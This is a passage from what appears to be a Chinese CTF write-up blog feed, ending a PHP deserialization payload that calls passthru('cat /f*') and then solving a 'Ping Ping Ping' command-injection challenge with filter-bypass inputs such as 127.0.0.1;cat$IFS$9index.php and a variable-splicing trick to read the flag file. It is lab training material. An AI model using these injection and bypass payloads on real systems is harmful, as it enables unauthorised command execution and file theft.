class="string">&quot;S&quot;</span>;S:<span class="number">20</span>:<span class="string">&quot;\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;dir&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><img src="25f376dd0b5cc047ca0951ac84059a34.png" alt="25f376dd0b5cc047ca0951ac84059a34.png" /><h2 id="30-Ping-Ping-Ping"><a href="#30-Ping-Ping-Ping" class="headerlink" title="30.Ping Ping Ping"></a>30.Ping Ping Ping</h2><img src="349142a23ffb190571f209f91cd0f173.png" alt="349142a23ffb190571f209f91cd0f173.png" /><img src="ceba1696d51eae85a3820a0d00ef3ab3.png" alt="ceba1696d51eae85a3820a0d00ef3ab3.png" /><p>空格和flag被ban了</p><img src="5ce731b01dcdbd163cf01d3cfd2fff87.png" alt="5ce731b01dcdbd163cf01d3cfd2fff87.png" /><p>symbol被ban了 , </p><p>127.0.0.1|ls</p><img src="d5fbcd5e74f7beb3f974da2202f2b978.png" alt="d5fbcd5e74f7beb3f974da2202f2b978.png" /><p>用$IFS代替空格  </p><p>$9 代替 &#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure><img src="224ce82d74ce207b444dab02cc62293d.png" alt="224ce82d74ce207b444dab02cc62293d.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;q=g;cat$IFS$9fla$q.php</span><br></pre></td></tr></table></figure><img src="42eab3f9433044da14d296dd6bb8f8e3.png" alt="42eab3f9433044da14d296dd6bb8f8e3.png" />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
